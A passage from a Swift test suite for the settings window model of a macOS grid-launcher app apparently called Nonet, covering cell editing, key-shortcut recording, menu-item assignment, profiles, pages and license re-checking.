// 担当: ui-settings
// SettingsModel を、偽物のサービスと一時フォルダの設定で組み立てた本物の NonetController につないで確かめる
import AppKit
import Foundation
import NonetCore
@testable import NonetUI
import SwiftUI
import Testing

@Suite @MainActor struct SettingsModelSelectionTests {
    @Test func startsOnTheGlobalProfile() throws {
        let h = try SettingsHarness()
        #expect(h.model.selectedProfile.isGlobal)
        #expect(h.model.selectedIndex == 0)
        #expect(h.model.selectedCell?.title == "Safari")
        #expect(h.model.appProfiles.map(\.name) == ["Xcode", "Safari"])
    }

    @Test func selectingAProfileResetsPageAndCell() throws {
        let h = try SettingsHarness()
        h.model.addPage()
        h.model.selectCell(5)
        #expect(h.model.pageIndex == 1)
        let xcode = try #require(h.xcodeProfile)
        h.model.selectProfile(xcode.id)
        #expect(h.model.selectedProfile.id == xcode.id)
        #expect(h.model.pageIndex == 0)
        #expect(h.model.selectedIndex == 0)
        #expect(h.model.selectedCell?.title == L10n.core("ビルド"))
        h.model.selectProfile(nil)
        #expect(h.model.selectedProfile.isGlobal)
    }

    @Test func arrowKeysMoveTheSelection() throws {
        let h = try SettingsHarness()
        h.model.selectCell(4)
        h.model.moveSelection(.up)
        #expect(h.model.selectedIndex == 1)
        h.model.moveSelection(.up)
        #expect(h.model.selectedIndex == 1)
        h.model.moveSelection(.right)
        #expect(h.model.selectedIndex == 2)
        h.model.selectCell(nil)
        h.model.moveSelection(.down)
        #expect(h.model.selectedIndex == 0)
        h.model.selectCell(42)
        #expect(h.model.selectedIndex == 8)
    }

    @Test func aDeletedProfileFallsBackToGlobal() throws {
        let h = try SettingsHarness()
        let xcode = try #require(h.xcodeProfile)
        h.model.selectProfile(xcode.id)
        h.controller.update { $0.removeProfile(id: xcode.id) }
        #expect(h.model.selectedProfile.isGlobal)
    }
}

@Suite @MainActor struct SettingsModelCellTests {
    @Test func clearingACellSavesIt() throws {
        let h = try SettingsHarness()
        h.model.clearCell(at: 0)
        #expect(h.model.selectedCell == nil)
        #expect(try h.saved()?.globalProfile.pages[0].cells[0] == nil)
    }

    @Test func duplicateGoesToTheNextEmptyCell() throws {
        let h = try SettingsHarness()
        let original = try #require(h.model.selectedCell)
        h.model.duplicateCell(at: 0)
        #expect(h.model.selectedIndex == 1)
        let copy = try #require(h.model.selectedCell)
        #expect(copy.id != original.id)
        #expect(copy.title == original.title)
        #expect(copy.action == original.action)
        #expect(h.model.gridMessage == nil)
    }

    @Test func duplicateInAFullProfileExplainsWhy() throws {
        let h = try SettingsHarness()
        let xcode = try #require(h.xcodeProfile)
        h.model.selectProfile(xcode.id)
        let before = h.controller.configuration
        h.model.duplicateCell(at: 0)
        #expect(h.model.gridMessage != nil)
        #expect(h.controller.configuration == before)
        // ページを足せば空きができる
        h.model.addPage()
        h.model.selectPage(0)
        h.model.duplicateCell(at: 0)
        #expect(h.model.pageIndex == 1)
        #expect(h.model.selectedIndex == 0)
        #expect(h.model.selectedCell?.title == L10n.core("ビルド"))
    }

    @Test func droppingACellSwapsAndFollowsIt() throws {
        let h = try SettingsHarness()
        let profile = h.model.selectedProfile
        let safari = try #require(h.model.selectedCell)
        let payload = SettingsDragPayload.cell(profileID: profile.id, address: CellAddress(page: 0, index: 0))
        #expect(h.model.handleDrop(payload, onto: 4))
        #expect(h.model.selectedIndex == 4)
        #expect(h.model.selectedCell?.id == safari.id)
        #expect(h.model.currentPage.cells[0] == nil)
        #expect(try h.saved()?.globalProfile.pages[0].cells[4]?.id == safari.id)
    }

    @Test func foreignDropsAreRefused() throws {
        let h = try SettingsHarness()
        let before = h.controller.configuration
        let other = SettingsDragPayload.cell(profileID: UUID(), address: CellAddress(page: 0, index: 0))
        #expect(!h.model.handleDrop(other, onto: 4))
        let same = SettingsDragPayload.cell(profileID: h.model.selectedProfile.id, address: CellAddress(page: 0, index: 4))
        #expect(!h.model.handleDrop(same, onto: 4))
        #expect(!h.model.handleDrop(.menuItem(id: "missing"), onto: 4))
        // ページの見出しへ: 同じページ・別のプロファイル・無いページは受け取らない
        #expect(!h.model.handleDrop(same, ontoPage: 0))
        #expect(!h.model.handleDrop(other, ontoPage: 0))
        #expect(!h.model.handleDrop(same, ontoPage: 5))
        #expect(h.controller.configuration == before)
    }

    @Test func emptyCellsAreCreatedFromAKind() throws {
        let h = try SettingsHarness()
        h.model.createCell(kind: .openURL, at: 1)
        #expect(h.model.selectedIndex == 1)
        #expect(h.model.selectedCell?.action == .openURL(URLAction(url: "")))
        // 埋まっているマスには作らない
        let before = h.controller.configuration
        h.model.createCell(kind: .ai, at: 0)
        #expect(h.controller.configuration == before)
    }

    @Test func switchingKindsKeepsWhatWasTyped() throws {
        let h = try SettingsHarness()
        h.model.createCell(kind: .script, at: 1)
        let id = try #require(h.model.selectedCell?.id)
        h.model.replaceAction(ofCell: id, with: .script(ScriptAction(source: "echo hi", runMode: .terminal)))
        h.model.changeKind(ofCell: id, to: .keystroke)
        #expect(h.model.selectedCell?.action == .keystroke(KeySequence([])))
        h.model.changeKind(ofCell: id, to: .script)
        #expect(h.model.selectedCell?.action == .script(ScriptAction(source: "echo hi", runMode: .terminal)))
        #expect(h.model.selectedCell?.id == id)
    }

    @Test func editsFindTheCellByIDAfterItMoved() throws {
        let h = try SettingsHarness()
        let id = try #require(h.model.selectedCell?.id)
        h.model.swapCells(CellAddress(page: 0, index: 0), CellAddress(page: 0, index: 8))
        h.model.updateCell(id: id) { $0.title = "ブラウザ" }
        #expect(h.model.currentPage.cells[8]?.title == "ブラウザ")
        #expect(try h.saved()?.globalProfile.pages[0].cells[8]?.title == "ブラウザ")
        // 無いマスは何もしない
        let before = h.controller.configuration
        h.model.updateCell(id: UUID()) { $0.title = "x" }
        #expect(h.controller.configuration == before)
    }

    @Test func choosingAnAppForALaunchCell() throws {
        let h = try SettingsHarness()
        h.model.createCell(kind: .launchApp, at: 1)
        let id = try #require(h.model.selectedCell?.id)
        h.model.chooseApp(SettingsFixtures.figma, forCell: id)
        let cell = try #require(h.model.selectedCell)
        #expect(cell.title == "Figma")
        #expect(cell.icon == .app(bundleID: SettingsFixtures.figma.bundleID))
        #expect(cell.action == .launchApp(LaunchAppAction(app: SettingsFixtures.figma)))
    }
}

@Suite @MainActor struct SettingsModelMenuTests {
    private func loadFigmaMenus(_ h: SettingsHarness) async {
        h.menus.apps = [SettingsMenuSamples.figma, SettingsMenuSamples.notes]
        h.menus.items = SettingsMenuSamples.figmaMenus
        h.model.showMenus(true)
        h.model.menuBrowser.select(SettingsMenuSamples.figma)
        await h.model.menuBrowser.waitUntilLoaded()
    }

    @Test func droppingAMenuItemAssignsIt() async throws {
        let h = try SettingsHarness()
        await loadFigmaMenus(h)
        let node = MenuItemNode(title: "自動レイアウトを追加", path: ["オブジェクト", "自動レイアウトを追加"], keyEquivalent: .key("a", .shift))
        #expect(h.model.handleDrop(.menuItem(id: node.id), onto: 1))
        let cell = try #require(h.model.selectedCell)
        #expect(h.model.selectedIndex == 1)
        #expect(cell.title == "自動レイアウトを追加")
        #expect(cell.action == .menuItem(MenuItemAction(app: SettingsFixtures.figma, path: node.path, keyEquivalent: node.keyEquivalent)))
        #expect(try h.saved()?.globalProfile.pages[0].cells[1]?.action == cell.action)
    }

    @Test func doubleClickFillsTheFirstEmptyCell() async throws {
        let h = try SettingsHarness()
        await loadFigmaMenus(h)
        let entry = try #require(h.model.menuBrowser.sections.first?.entries.first)
        // 選んでいるマス 0 は埋まっているので、最初の空き（1）へ
        h.model.assignMenuItem(entry.node)
        #expect(h.model.selectedIndex == 1)
        #expect(h.model.selectedCell?.title == "元に戻す")
        // 選んでいる空きマスがあればそこへ
        h.model.selectCell(7)
        h.model.assignMenuItem(entry.node)
        #expect(h.model.selectedIndex == 7)
        #expect(h.model.selectedCell?.action.kind == .menuItem)
    }

    @Test func aFullProfileReportsThatThereIsNoRoom() async throws {
        let h = try SettingsHarness()
        let xcode = try #require(h.xcodeProfile)
        h.model.selectProfile(xcode.id)
        await loadFigmaMenus(h)
        let before = h.controller.configuration
        let entry = try #require(h.model.menuBrowser.sections.first?.entries.first)
        h.model.assignMenuItem(entry.node)
        #expect(h.model.gridMessage != nil)
        #expect(h.controller.configuration == before)
    }

    @Test func openingTheMenuPanelPicksTheProfilesApp() async throws {
        let h = try SettingsHarness()
        let xcodeApp = RunningAppInfo(app: SettingsFixtures.xcode, processID: 303)
        h.menus.apps = [SettingsMenuSamples.figma, xcodeApp]
        let xcode = try #require(h.xcodeProfile)
        h.model.selectProfile(xcode.id)
        h.model.showMenus(true)
        #expect(h.model.rightPanel == .menus)
        #expect(h.model.menuBrowser.selectedApp == xcodeApp)
        await h.model.menuBrowser.waitUntilLoaded()
        #expect(h.menus.requested == [xcodeApp])
        h.model.showMenus(false)
        #expect(h.model.rightPanel == .inspector)
    }
}

@Suite @MainActor struct SettingsModelRecordingTests {
    private func keystrokeCell(_ h: SettingsHarness) throws -> UUID {
        h.model.createCell(kind: .keystroke, at: 1)
        return try #require(h.model.selectedCell?.id)
    }

    @Test func recordsAKeyAndBlocksSessionsMeanwhile() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        #expect(h.controller.isRecordingKeys)
        #expect(h.model.isRecording)
        h.model.handleFlagsChanged(.command)
        h.model.handleKeyDown(keyCode: 0x0B, characters: "b", flags: .command)
        h.model.finishRecording()
        #expect(!h.controller.isRecordingKeys)
        #expect(!h.model.isRecording)
        #expect(h.model.recordingCellID == nil)
        let cell = try #require(h.model.cell(id: id))
        #expect(cell.action == .keystroke(.key("b", .command)))
        #expect(cell.title == "⌘B")
        #expect(try h.saved()?.globalProfile.pages[0].cells[1]?.action == .keystroke(.key("b", .command)))
    }

    @Test func escapeCancelsWithoutChanges() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.replaceAction(ofCell: id, with: .keystroke(.key("r", .command)))
        h.model.beginRecording(cellID: id)
        h.model.handleKeyDown(keyCode: 0x0B, characters: "b", flags: .command)
        h.model.handleKeyDown(keyCode: 0x35, characters: "\u{1B}", flags: [])
        #expect(!h.controller.isRecordingKeys)
        #expect(h.model.cell(id: id)?.action == .keystroke(.key("r", .command)))
    }

    @Test func fourKeysFinishOnTheirOwn() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        for (code, character) in [(UInt16(0x25), "l"), (0x08, "c"), (0x00, "a"), (0x09, "v")] {
            h.model.handleKeyDown(keyCode: code, characters: character, flags: .command)
        }
        #expect(!h.controller.isRecordingKeys)
        #expect(h.model.cell(id: id)?.action == .keystroke(.sequence(
            .key("l", .command), .key("c", .command), .key("a", .command), .key("v", .command)
        )))
    }

    @Test func escapeButtonAddsEscape() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        h.model.appendEscapeToRecording()
        h.model.finishRecording()
        #expect(h.model.cell(id: id)?.action == .keystroke(.special(.escape)))
    }

    @Test func leavingTheWindowCommitsTheRecording() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        h.model.handleKeyDown(keyCode: 0x0B, characters: "b", flags: .command)
        h.model.windowDidResignKey()
        #expect(!h.controller.isRecordingKeys)
        #expect(h.model.cell(id: id)?.action == .keystroke(.key("b", .command)))
    }

    @Test func selectingAnotherCellCommitsToTheRecordedCell() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        h.model.handleKeyDown(keyCode: 0x0B, characters: "b", flags: .command)
        h.model.selectCell(0)
        #expect(!h.controller.isRecordingKeys)
        #expect(h.model.cell(id: id)?.action == .keystroke(.key("b", .command)))
        #expect(h.model.selectedCell?.title == "Safari")
    }

    @Test func closingTheWindowStopsRecordingWithoutKeys() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        h.model.windowWillClose()
        #expect(!h.controller.isRecordingKeys)
        #expect(h.model.cell(id: id)?.action == .keystroke(KeySequence([])))
    }

    @Test func clearingTheRecordedCellCancels() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        h.model.handleKeyDown(keyCode: 0x0B, characters: "b", flags: .command)
        h.model.clearCell(at: 1)
        #expect(!h.controller.isRecordingKeys)
        #expect(h.model.cell(id: id) == nil)
    }

    @Test func changingKindCancelsRecording() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        h.model.changeKind(ofCell: id, to: .openURL)
        #expect(!h.controller.isRecordingKeys)
        #expect(h.model.cell(id: id)?.action.kind == .openURL)
    }

    /// 記録中にライセンスのタブへ移って ⌘V を押しても、記録には入らない
    @Test func switchingTabsFinishesTheRecording() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        h.model.handleKeyDown(keyCode: 0x0B, characters: "b", flags: .command)
        h.model.selectTab(.license)
        #expect(h.model.tab == .license)
        #expect(!h.model.isRecording)
        #expect(!h.controller.isRecordingKeys)
        #expect(h.model.recordingCellID == nil)
        #expect(h.model.cell(id: id)?.action == .keystroke(.key("b", .command)))
        h.model.handleKeyDown(keyCode: 0x09, characters: "v", flags: .command)
        #expect(h.model.cell(id: id)?.action == .keystroke(.key("b", .command)))
    }

    @Test func theWindowsTabsFinishTheRecording() throws {
        _ = NSApplication.shared
        let h = try SettingsHarness()
        let controller = SettingsWindowController(controller: h.controller, license: h.license, services: h.services, links: AppLinks(), onCheckForUpdates: nil)
        controller.autosavesFrame = false
        _ = controller.loadWindow()
        controller.model.createCell(kind: .keystroke, at: 1)
        let id = try #require(controller.model.selectedCell?.id)
        controller.model.beginRecording(cellID: id)
        controller.select(.general)
        #expect(!h.controller.isRecordingKeys)
        #expect(!controller.model.isRecording)
    }

    @Test func creatingACellFromTheContextMenuFinishesTheRecording() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        h.model.handleKeyDown(keyCode: 0x0B, characters: "b", flags: .command)
        h.model.createCell(kind: .openURL, at: 3)
        #expect(h.model.selectedIndex == 3)
        #expect(h.model.recordingCellID == nil)
        #expect(!h.controller.isRecordingKeys)
        #expect(h.model.cell(id: id)?.action == .keystroke(.key("b", .command)))
    }

    @Test func clickingOutsideTheRecorderFinishesIt() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        h.model.handleKeyDown(keyCode: 0x0B, characters: "b", flags: .command)
        // 「Esc を加える」などのボタンは記録欄の中
        h.model.handleClick(insideRecorder: true)
        #expect(h.model.isRecording)
        // 表示名の欄など、外をクリックした
        h.model.handleClick(insideRecorder: false)
        #expect(!h.model.isRecording)
        #expect(!h.controller.isRecordingKeys)
        #expect(h.model.cell(id: id)?.action == .keystroke(.key("b", .command)))
        // 記録していないときのクリックは何もしない
        h.model.handleClick(insideRecorder: false)
        #expect(h.model.cell(id: id)?.action == .keystroke(.key("b", .command)))
    }

    @Test func clickHitTestingUsesTheRecorderArea() {
        _ = NSApplication.shared
        let window = NSWindow(contentRect: NSRect(x: 0, y: 0, width: 400, height: 300), styleMask: [.titled], backing: .buffered, defer: false)
        window.isReleasedWhenClosed = false
        let content = NSView(frame: NSRect(x: 0, y: 0, width: 400, height: 300))
        window.contentView = content
        let area = NSView(frame: NSRect(x: 100, y: 100, width: 150, height: 60))
        content.addSubview(area)
        let other = NSWindow(contentRect: NSRect(x: 0, y: 0, width: 400, height: 300), styleMask: [.titled], backing: .buffered, defer: false)
        other.isReleasedWhenClosed = false
        defer {
            window.close()
            other.close()
        }
        #expect(SettingsKeyEventMonitor.contains(area, locationInWindow: NSPoint(x: 120, y: 130), of: window))
        #expect(!SettingsKeyEventMonitor.contains(area, locationInWindow: NSPoint(x: 20, y: 130), of: window))
        #expect(!SettingsKeyEventMonitor.contains(area, locationInWindow: NSPoint(x: 120, y: 200), of: window))
        #expect(!SettingsKeyEventMonitor.contains(area, locationInWindow: NSPoint(x: 120, y: 130), of: other))
        #expect(!SettingsKeyEventMonitor.contains(area, locationInWindow: NSPoint(x: 120, y: 130), of: nil))
        #expect(!SettingsKeyEventMonitor.contains(nil, locationInWindow: NSPoint(x: 120, y: 130), of: window))
    }

    /// 記録が終わる前に種類が変わっていたら、キーで上書きしない
    @Test func aFinishedRecordingDoesNotOverwriteAnotherKind() throws {
        let h = try SettingsHarness()
        let id = try keystrokeCell(h)
        h.model.beginRecording(cellID: id)
        h.model.handleKeyDown(keyCode: 0x0B, characters: "b", flags: .command)
        h.controller.update { configuration in
            configuration.setCell(Cell(id: id, title: "", icon: .symbol("link"), action: .openURL(URLAction(url: "https://example.com"))),
                                  at: CellAddress(page: 0, index: 1), profileID: configuration.globalProfile.id)
        }
        h.model.finishRecording()
        #expect(h.model.cell(id: id)?.action == .openURL(URLAction(url: "https://example.com")))
        #expect(!h.controller.isRecordingKeys)
    }
}

@Suite @MainActor struct SettingsModelEditTests {
    @Test func updatesReadTheCurrentContent() throws {
        let h = try SettingsHarness()
        h.model.createCell(kind: .script, at: 1)
        let id = try #require(h.model.selectedCell?.id)
        h.model.updateAction(ofCell: id, as: ScriptAction.self) { $0.runMode = .terminal }
        h.model.updateAction(ofCell: id, as: ScriptAction.self) { $0.source = "echo hi" }
        #expect(h.model.cell(id: id)?.action == .script(ScriptAction(source: "echo hi", runMode: .terminal)))
        // 自動で付いた名前は中身に合わせる
        #expect(h.model.cell(id: id)?.title == L10n.core("ターミナル"))
    }

    @Test func updatesOfAnotherKindAreIgnored() throws {
        let h = try SettingsHarness()
        h.model.createCell(kind: .openURL, at: 1)
        let id = try #require(h.model.selectedCell?.id)
        h.model.changeKind(ofCell: id, to: .keystroke)
        let before = h.controller.configuration
        // 消えかけの URL 欄から遅れて届いた確定
        h.model.updateAction(ofCell: id, as: URLAction.self) { $0.url = "example.com" }
        #expect(h.controller.configuration == before)
        #expect(h.model.cell(id: id)?.action == .keystroke(KeySequence([])))
    }

    /// 打ちかけの欄は、種類を切り替える前に確定する（切り替えた後には書き戻さない）
    @Test func changingTheKindFlushesTypingFirst() throws {
        let h = try SettingsHarness()
        h.model.createCell(kind: .shortcut, at: 1)
        let id = try #require(h.model.selectedCell?.id)
        let buffer = SettingsDraftBuffer(value: "", delay: .seconds(60)) { [model = h.model] name in
            model.updateAction(ofCell: id, as: ShortcutAction.self) { $0.name = name }
        }
        buffer.registry = h.model.pendingEdits
        buffer.edit("翻訳")
        h.model.changeKind(ofCell: id, to: .ai)
        #expect(h.model.cell(id: id)?.action.kind == .ai)
        buffer.flush()
        #expect(h.model.cell(id: id)?.action.kind == .ai)
        h.model.changeKind(ofCell: id, to: .shortcut)
        #expect(h.model.cell(id: id)?.action == .shortcut(ShortcutAction(name: "翻訳")))
    }

    @Test func switchingTabsFlushesTyping() throws {
        let h = try SettingsHarness()
        var calls: [String] = []
        let buffer = SettingsDraftBuffer(value: "", delay: .seconds(60)) { calls.append($0) }
        buffer.registry = h.model.pendingEdits
        buffer.edit("x")
        h.model.selectTab(.general)
        #expect(calls == ["x"])
        buffer.edit("xy")
        h.model.windowWillClose()
        #expect(calls == ["x", "xy"])
    }
}

/// 使い回すウィンドウでは onAppear がもう一度呼ばれないので、ウィンドウに戻ったときに読み込みを続ける
@Suite @MainActor struct SettingsModelWindowLifecycleTests {
    @Test func aMenuLoadStoppedByClosingResumesOnReopen() async throws {
        let h = try SettingsHarness()
        let xcodeApp = RunningAppInfo(app: SettingsFixtures.xcode, processID: 303)
        h.menus.apps = [xcodeApp]
        h.menus.items = SettingsMenuSamples.figmaMenus
        h.menus.delayByProcess[303] = .seconds(30)
        let xcode = try #require(h.xcodeProfile)
        h.model.selectProfile(xcode.id)
        h.model.showMenus(true)
        #expect(h.model.menuBrowser.state == .loading)
        h.model.windowWillClose()
        #expect(h.model.menuBrowser.state == .idle)
        #expect(h.model.menuBrowser.selectedApp == xcodeApp)

        h.menus.delayByProcess[303] = nil
        h.model.windowDidBecomeKey()
        #expect(h.model.menuBrowser.state == .loading)
        await h.model.menuBrowser.waitUntilLoaded()
        #expect(!h.model.menuBrowser.sections.isEmpty)
        // 読み終えた後に戻ってきても読み直さない
        let requests = h.menus.requested.count
        h.model.windowDidBecomeKey()
        await h.model.menuBrowser.waitUntilLoaded()
        #expect(h.menus.requested.count == requests)
    }

    @Test func aShortcutLoadStoppedByClosingResumesOnReopen() async throws {
        let h = try SettingsHarness()
        h.shortcuts.names = ["翻訳"]
        h.model.createCell(kind: .shortcut, at: 1)
        h.model.shortcutList.loadIfNeeded()
        #expect(h.model.shortcutList.state == .loading)
        h.model.windowWillClose()
        #expect(h.model.shortcutList.state == .idle)
        h.model.windowDidBecomeKey()
        await h.model.shortcutList.waitUntilLoaded()
        #expect(h.model.shortcutList.state == .loaded(["翻訳"]))
    }

    @Test func newShortcutsAppearAfterComingBack() async throws {
        let h = try SettingsHarness()
        h.shortcuts.names = ["要約"]
        h.model.shortcutList.loadIfNeeded()
        await h.model.shortcutList.waitUntilLoaded()
        // ショートカット.app で作ってから戻ってきた
        h.shortcuts.names = ["要約", "翻訳"]
        h.model.createCell(kind: .shortcut, at: 1)
        h.model.windowDidBecomeKey()
        // 読み直す間も前の一覧を出しておく
        #expect(h.model.shortcutList.state == .loaded(["要約"]))
        #expect(h.model.shortcutList.isRefreshing)
        await h.model.shortcutList.waitUntilLoaded()
        #expect(h.model.shortcutList.state == .loaded(["翻訳", "要約"].sorted { $0.localizedStandardCompare($1) == .orderedAscending }))
        #expect(!h.model.shortcutList.isRefreshing)
        #expect(h.shortcuts.loadCount == 2)
    }

    @Test func shortcutsAreNotReadWhileNoShortcutCellIsShown() async throws {
        let h = try SettingsHarness()
        h.model.shortcutList.loadIfNeeded()
        await h.model.shortcutList.waitUntilLoaded()
        h.model.windowDidBecomeKey()
        await h.model.shortcutList.waitUntilLoaded()
        #expect(h.shortcuts.loadCount == 1)
        // 次にショートカットのマスを開いたとき（onAppear）に読み直す
        h.model.shortcutList.loadIfNeeded()
        await h.model.shortcutList.waitUntilLoaded()
        #expect(h.shortcuts.loadCount == 2)
    }

    @Test func installedAppsAreReadAgainWhenTheListOpens() throws {
        let h = try SettingsHarness()
        h.model.reloadInstalledApps()
        #expect(!h.model.installedApps.contains(SettingsFixtures.terminal))
        h.installed.apps.append(SettingsFixtures.terminal)
        h.model.reloadInstalledApps()
        #expect(h.model.installedApps.contains(SettingsFixtures.terminal))
    }

    @Test func theAddProfileSheetReadsTheAppsEachTime() async throws {
        _ = NSApplication.shared
        let h = try SettingsHarness()
        for _ in 0..<2 {
            let window = NSWindow(contentRect: NSRect(x: 0, y: 0, width: 460, height: 520), styleMask: [.titled], backing: .buffered, defer: false)
            window.isReleasedWhenClosed = false
            window.contentView = NSHostingView(rootView: SettingsAddProfileSheet(model: h.model))
            window.contentView?.layoutSubtreeIfNeeded()
            try await Task.sleep(for: .milliseconds(50))
            window.contentView = nil
            window.close()
        }
        #expect(h.installed.listCount == 2)
    }

    @Test func theLicenseIsCheckedAgainOnReopen() throws {
        let pair = LicenseSigner.generateKeyPair()
        let signer = try LicenseSigner(privateKeyBase64: pair.privateKeyBase64)
        let key = try signer.sign(LicenseInfo(licenseID: "NONET-TEST-2", licensee: "山田 太郎", email: nil, issuedAt: Date(timeIntervalSince1970: 1_800_000_000)))
        let h = try SettingsHarness(verifier: try LicenseVerifier(publicKeyBase64: pair.publicKeyBase64))
        #expect(h.license.entitlement == .trial(daysLeft: 14))
        // 別の経路（初回の案内など）で登録された
        h.licenseStorage.licenseKey = key
        h.model.windowDidBecomeKey()
        guard case .licensed(let info) = h.license.entitlement else {
            Issue.record("読み直していない: \(h.license.entitlement)")
            return
        }
        #expect(info.licensee == "山田 太郎")
    }
}

@Suite @MainActor struct SettingsModelPageTests {
    @Test func addsPagesUpToTheLimit() throws {
        let h = try SettingsHarness()
        h.model.addPage()
        #expect(h.model.selectedProfile.pages.count == 2)
        #expect(h.model.pageIndex == 1)
        h.model.addPage()
        #expect(h.model.pageIndex == 2)
        #expect(!h.model.canAddPage)
        h.model.addPage()
        #expect(h.model.selectedProfile.pages.count == 3)
        #expect(try h.saved()?.globalProfile.pages.count == 3)
    }

    @Test func emptyPagesAreRemovedWithoutAsking() throws {
        let h = try SettingsHarness()
        h.model.addPage()
        h.model.requestRemovePage(1)
        #expect(h.model.confirmation == nil)
        #expect(h.model.selectedProfile.pages.count == 1)
        #expect(h.model.pageIndex == 0)
        #expect(!h.model.canRemovePage)
        // 最後の1ページは消せない
        h.model.requestRemovePage(0)
        #expect(h.model.confirmation == nil)
        #expect(h.model.selectedProfile.pages.count == 1)
    }

    @Test func pagesWithCellsNeedConfirmation() throws {
        let h = try SettingsHarness()
        h.model.addPage()
        h.model.requestRemovePage(0)
        let confirmation = try #require(h.model.confirmation)
        #expect(confirmation == .removePage(profileID: h.model.selectedProfile.id, index: 0))
        #expect(h.model.selectedProfile.pages.count == 2)
        h.model.confirm(confirmation)
        #expect(h.model.confirmation == nil)
        #expect(h.model.selectedProfile.pages.count == 1)
        #expect(h.model.pageIndex == 0)
        #expect(h.model.currentPage.cells.allSatisfy { $0 == nil })
    }

    @Test func selectingAPageOutOfRangeIsIgnored() throws {
        let h = try SettingsHarness()
        h.model.selectPage(2)
        #expect(h.model.pageIndex == 0)
    }
}

@Suite @MainActor struct SettingsModelProfileTests {
    @Test func addingAProfileUsesThePreset() throws {
        let h = try SettingsHarness()
        h.model.isAddingProfile = true
        h.model.addProfile(for: SettingsFixtures.figma)
        #expect(!h.model.isAddingProfile)
        let profile = h.model.selectedProfile
        #expect(profile.app == SettingsFixtures.figma)
        #expect(profile.pages[0].cells.contains { $0 != nil })
        #expect(h.model.appProfiles.map(\.name) == ["Xcode", "Safari", "Figma"])
    }

    @Test func addingAProfileWithoutAPresetIsEmpty() throws {
        let h = try SettingsHarness()
        h.model.addProfile(for: AppReference(bundleID: "com.example.Plain", name: "Plain"))
        #expect(h.model.selectedProfile.name == "Plain")
        #expect(h.model.currentPage.cells.allSatisfy { $0 == nil })
    }

    @Test func addingAnExistingAppSelectsItsProfile() throws {
        let h = try SettingsHarness()
        h.model.addProfile(for: AppReference(bundleID: "COM.APPLE.DT.XCODE", name: "Xcode"))
        #expect(h.model.selectedProfile.id == h.xcodeProfile?.id)
        #expect(h.model.appProfiles.count == 2)
    }

    @Test func deletingAsksFirstAndSelectsTheNextProfile() throws {
        let h = try SettingsHarness()
        let xcode = try #require(h.xcodeProfile)
        h.model.selectProfile(xcode.id)
        h.model.requestDeleteProfile(xcode.id)
        let confirmation = try #require(h.model.confirmation)
        #expect(confirmation == .deleteProfile(id: xcode.id, name: "Xcode"))
        #expect(h.xcodeProfile != nil)
        h.model.confirm(confirmation)
        #expect(h.xcodeProfile == nil)
        #expect(h.model.selectedProfile.name == "Safari")
        #expect(try h.saved()?.profiles.count == 2)
        // 最後のアプリを消すとグローバルへ
        h.model.deleteProfile(h.model.selectedProfile.id)
        #expect(h.model.selectedProfile.isGlobal)
    }

    @Test func deletingAnotherProfileKeepsTheSelection() throws {
        let h = try SettingsHarness()
        let xcode = try #require(h.xcodeProfile)
        let safari = try #require(h.safariProfile)
        h.model.selectProfile(safari.id)
        h.model.deleteProfile(xcode.id)
        #expect(h.model.selectedProfile.id == safari.id)
    }

    @Test func theGlobalProfileCannotBeDeleted() throws {
        let h = try SettingsHarness()
        h.model.requestDeleteProfile(h.model.selectedProfile.id)
        #expect(h.model.confirmation == nil)
    }

    @Test func enablingAndReordering() throws {
        let h = try SettingsHarness()
        let safari = try #require(h.safariProfile)
        #expect(safari.mode == .global)
        h.model.setProfileMode(safari.id, .profile)
        #expect(h.safariProfile?.isEnabled == true)
        h.model.setProfileMode(safari.id, .off)
        #expect(try h.saved()?.isTurnedOff(forBundleID: SettingsFixtures.safari.bundleID) == true)
        // グローバルには使い方が無い
        h.model.setProfileMode(h.controller.configuration.globalProfile.id, .off)
        #expect(h.controller.configuration.globalProfile.mode == .profile)
        h.model.setProfileMode(safari.id, .profile)
        h.model.moveProfiles(fromOffsets: IndexSet(integer: 1), toOffset: 0)
        #expect(h.model.appProfiles.map(\.name) == ["Safari", "Xcode"])
        #expect(try h.saved()?.profiles.map(\.name) == [L10n.globalName, "Safari", "Xcode"])
    }
}

@Suite @MainActor struct SettingsModelGeneralTests {
    @Test func settingsAreSavedImmediately() throws {
        let h = try SettingsHarness()
        h.model.setSetting(\.hudDelay, 0.5)
        h.model.setSetting(\.haptics, .strong)
        h.model.setSetting(\.fireMode, .onFingerLift)
        #expect(h.model.settings.hudDelay == 0.5)
        let saved = try #require(try h.saved())
        #expect(saved.settings.hudDelay == 0.5)
        #expect(saved.settings.haptics == .strong)
        #expect(saved.settings.fireMode == .onFingerLift)
    }

    @Test func jisKeyboardsWarnAboutRightOption() throws {
        let jis = try SettingsHarness(isJISKeyboard: true)
        jis.model.setSetting(\.trigger, .rightOption)
        #expect(jis.model.triggerWarning != nil)
        jis.model.setSetting(\.trigger, .rightCommand)
        #expect(jis.model.triggerWarning == nil)
        let ansi = try SettingsHarness(isJISKeyboard: false)
        ansi.model.setSetting(\.trigger, .rightOption)
        #expect(ansi.model.triggerWarning == nil)
    }

    @Test func disablingShowsABannerThatReenables() throws {
        let h = try SettingsHarness()
        h.model.setSetting(\.isEnabled, false)
        #expect(h.controller.status == .disabled)
        let banner = try #require(h.model.statusBanner)
        #expect(banner.buttons.map(\.action) == [.enable])
        h.model.perform(.enable)
        #expect(h.model.settings.isEnabled)
        #expect(h.model.statusBanner == nil)
    }

    @Test func accessibilityBannerActions() throws {
        let h = try SettingsHarness()
